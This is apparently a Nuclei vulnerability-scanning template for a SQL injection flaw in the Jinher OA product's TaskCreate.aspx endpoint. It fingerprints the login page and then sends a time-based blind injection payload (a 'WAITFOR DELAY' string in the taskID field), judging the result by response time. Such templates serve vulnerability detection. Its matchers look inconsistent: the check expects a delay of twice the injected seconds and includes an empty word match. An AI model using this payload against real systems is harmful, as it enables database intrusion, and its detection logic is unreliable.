id: poc-yaml-jinher-taskcreate-aspx-sqli
info:
  name: 金和OA TaskCreate.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(2,5)}}"
  t2: "{{to_number(t1) + to_number(t1)}}"
  t3: "{{to_number(t2) + 2}}"

flow: http(1) && http(2)

http:
  - id: initial-check
    method: GET
    path:
      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "JHSoft"

  - id: sqli-check
    method: POST
    path:
      - "{{BaseURL}}/c6/Jhsoft.Web.dailytaskmanage/TaskCreate.aspx/"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "taskID='WAitFor+DelaY'0:0:{{t1}}'--"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - ""
      - type: dsl
        dsl:
          - "duration > to_number(t2)"
          - "duration < to_number(t3)"
